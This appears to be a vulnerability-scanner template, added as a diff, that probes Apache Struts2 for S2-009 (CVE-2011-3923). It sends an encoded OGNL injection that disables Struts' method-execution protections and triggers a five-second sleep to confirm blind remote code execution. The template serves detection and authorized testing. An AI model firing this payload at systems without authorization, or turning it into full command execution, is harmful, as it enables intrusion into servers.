@@ -1,0 +1,36 @@
+id: local-struts2-s2-009-cmd-rce
+
+info:
+  name: Struts2 S2-009 Command Execution via Parameter Name OGNL (CVE-2011-3923)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-009 RCE via parameter name trick. The OGNL payload is
+    placed in the "name" string parameter; a second parameter z[(name)('x')]=true
+    forces OGNL evaluation. S2-009 output is NOT reflected in the HTTP response
+    (blind RCE). Detection uses Thread.sleep(5000) time-based method — a 5+
+    second delay confirms RCE. The longer sleep (vs math probe's 3s) ensures
+    this template can be distinguished as a confirmed-exploit probe.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-009
+    - https://nvd.nist.gov/vuln/detail/CVE-2011-3923
+  tags: safe-poc,exploit,struts2,s2-009,cve,cve2011,rce,ognl,time-based
+
+http:
+  - method: GET
+    path:
+      # Decoded payload in name:
+      # (#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),
+      #  #_memberAccess["allowStaticMethodAccess"]=new java.lang.Boolean(true),
+      #  @java.lang.Thread@sleep(5000))(meh)
+      - "{{BaseURL}}/ajax/example5.action?age=1&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dnew+java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]%3Dnew+java.lang.Boolean(true),%40java.lang.Thread%40sleep(5000))(meh)&z[%28name%29%28%27meh%27%29]=true"
+      - "{{BaseURL}}/ajax/example5?age=1&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dnew+java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]%3Dnew+java.lang.Boolean(true),%40java.lang.Thread%40sleep(5000))(meh)&z[%28name%29%28%27meh%27%29]=true"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
